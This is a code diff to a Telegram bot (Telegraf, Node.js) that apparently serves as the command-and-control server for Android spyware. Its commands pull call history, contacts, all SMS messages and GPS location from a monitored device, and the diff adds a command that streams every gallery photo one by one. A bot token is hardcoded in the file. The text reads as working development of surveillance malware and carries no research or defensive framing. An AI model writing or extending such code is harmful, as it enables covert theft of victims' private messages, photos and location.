@@ -35,7 +35,7 @@ let requestingChatId = null;
 const BOT_TOKEN = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';
 const bot = new Telegraf(BOT_TOKEN);
 
-bot.start((ctx) => ctx.reply('Bot is running.\n\nAvailable commands:\n/ch - Get call history\n/contact - Get contacts list\n/as - Get all SMS messages\n/loc - Get current GPS location'));
+bot.start((ctx) => ctx.reply('Bot is running.\n\nAvailable commands:\n/ch - Get call history\n/contact - Get contacts list\n/as - Get all SMS messages\n/loc - Get current GPS location\n/ga - Get all gallery photos (continuous)'));
 
 bot.command('ch', (ctx) => {
     // Acknowledge to the user
@@ -67,6 +67,12 @@ bot.command('as', (ctx) => {
 bot.command('loc', (ctx) => {
     ctx.reply('Command received. Fetching GPS location from the Android device...');
     pendingCommand = 'loc';
+    requestingChatId = ctx.chat.id;
+});
+
+bot.command('ga', (ctx) => {
+    ctx.reply('Command received. The Android device will now continuously send gallery photos one-by-one until you send another command.');
+    pendingCommand = 'ga';
     requestingChatId = ctx.chat.id;
 });
 
